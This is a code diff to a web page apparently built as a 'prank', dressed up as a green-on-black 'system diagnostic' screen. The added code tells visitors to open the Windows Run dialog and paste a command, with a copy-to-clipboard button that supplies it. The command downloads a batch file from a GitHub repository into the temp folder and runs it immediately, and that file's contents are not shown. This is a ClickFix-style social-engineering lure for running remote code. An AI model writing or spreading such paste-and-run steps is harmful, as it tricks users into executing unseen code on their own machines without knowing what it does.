@@ -144,13 +144,22 @@
   .dt-row span.ok {
     color: #00e650;
   }
-  .dt-btn-group {
-    margin-top: 24px;
-    display: flex;
-    gap: 14px;
+  .cmd-box {
+    background: #040608;
+    border: 1px solid #1a3320;
+    border-left: 3px solid #00e650;
+    color: #00e650;
+    font-family: Consolas, "Courier New", monospace;
+    font-size: 13px;
+    padding: 14px;
+    margin: 14px 0;
+    line-height: 1.4;
+    word-break: break-all;
+    -webkit-user-select: all;
+    user-select: all;
   }
-  .dt-btn {
-    flex: 1;
+  .copy-btn {
+    width: 100%;
     background: #0f1c14;
     border: 1px solid #00e650;
     color: #00e650;
@@ -161,20 +170,21 @@
     cursor: pointer;
     text-align: center;
     transition: all 0.2s;
+    letter-spacing: 0.5px;
   }
-  .dt-btn:hover {
+  .copy-btn:hover {
     background: #00e650;
     color: #040608;
-    box-shadow: 0 0 15px #00e650;
+    box-shadow: 0 0 18px rgba(0, 230, 80, 0.4);
   }
-  .dt-btn.real-term {
-    border-color: #ffd228;
-    color: #ffd228;
+  .cmd-hint {
+    margin-top: 14px;
+    font-size: 12px;
+    color: #72967b;
+    line-height: 1.5;
   }
-  .dt-btn.real-term:hover {
-    background: #ffd228;
-    color: #040608;
-    box-shadow: 0 0 15px #ffd228;
+  .cmd-hint b {
+    color: #00e650;
   }
 </style>
 </head>
@@ -192,17 +202,22 @@
 <div id="desktop-container">
   <canvas id="desktop-canvas"></canvas>
 
-  <!-- Initial Desktop Verification / Launcher Dialog -->
+  <!-- Initial Desktop Verification / Terminal Command Display -->
   <div id="desktop-launcher">
     <div class="dt-title">&gt; SYSTEM DIAGNOSTIC FRAMEWORK</div>
     <div class="dt-row">&gt; HARDWARE AUDIT: <span class="ok">[OK] DESKTOP / LAPTOP VERIFIED</span></div>
-    <div class="dt-row">&gt; DISPLAY SUBSYSTEM: <span class="ok">[OK] FULL RESOLUTION READY</span></div>
-    <div class="dt-row">&gt; MEME PAYLOADS: <span class="ok">[OK] 18 ASSETS DETECTED</span></div>
-    <div class="dt-row">&gt; STATUS: READY FOR LAUNCH</div>
+    <div class="dt-row">&gt; ARCHITECTURE: <span class="ok">[OK] REAL TERMINAL READY</span></div>
+    <div class="dt-row" style="margin-top: 16px; color: #ffd228; font-weight: bold;">
+      &gt; PASTE THIS COMMAND INTO YOUR TERMINAL TO RUN:
+    </div>
     
-    <div class="dt-btn-group">
-      <button class="dt-btn real-term" id="btn-real-term">&gt; LAUNCH REAL TERMINAL (.BAT)</button>
-      <button class="dt-btn" id="btn-web-term">&gt; RUN IN BROWSER FULLSCREEN</button>
+    <div class="cmd-box" id="cmd-display">curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\launch.bat" &amp;&amp; "%TEMP%\launch.bat"</div>
+
+    <button class="copy-btn" id="btn-copy">&gt; CLICK TO COPY COMMAND</button>
+
+    <div class="cmd-hint">
+      &gt; <b>Step 1:</b> Press <b>Win + R</b>, type <b>cmd</b>, and press <b>Enter</b>.<br>
+      &gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.
     </div>
   </div>
 </div>
@@ -1108,17 +1123,38 @@ window.addEventListener("DOMContentLoaded", () => {
     const sfx = new WebSFX();
     const prank = new WebChaosPrank(canvas, sfx);
 
-    document.getElementById("btn-real-term").addEventListener("click", () => {
-      triggerRealTerminalDownload();
-    });
-
-    document.getElementById("btn-web-term").addEventListener("click", () => {
-      launcher.style.display = "none";
-      // Request fullscreen
-      const elem = document.documentElement;
-      if (elem.requestFullscreen) elem.requestFullscreen();
-      else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-      prank.start();
+    const copyBtn = document.getElementById("btn-copy");
+    const cmdStr = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\launch.bat" && "%TEMP%\\launch.bat"';
+    copyBtn.addEventListener("click", () => {
+      sfx.init();
+      sfx.blip();
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(cmdStr).then(() => {
+          copyBtn.textContent = "[ COPIED TO CLIPBOARD! ]";
+          copyBtn.style.background = "#00e650";
+          copyBtn.style.color = "#040608";
+          setTimeout(() => {
+            copyBtn.textContent = "> CLICK TO COPY COMMAND";
+            copyBtn.style.background = "#0f1c14";
+            copyBtn.style.color = "#00e650";
+          }, 2500);
+        });
+      } else {
+        const ta = document.createElement("textarea");
+        ta.value = cmdStr;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand("copy");
+        document.body.removeChild(ta);
+        copyBtn.textContent = "[ COPIED TO CLIPBOARD! ]";
+        copyBtn.style.background = "#00e650";
+        copyBtn.style.color = "#040608";
+        setTimeout(() => {
+          copyBtn.textContent = "> CLICK TO COPY COMMAND";
+          copyBtn.style.background = "#0f1c14";
+          copyBtn.style.color = "#00e650";
+        }, 2500);
+      }
     });
   }
 });
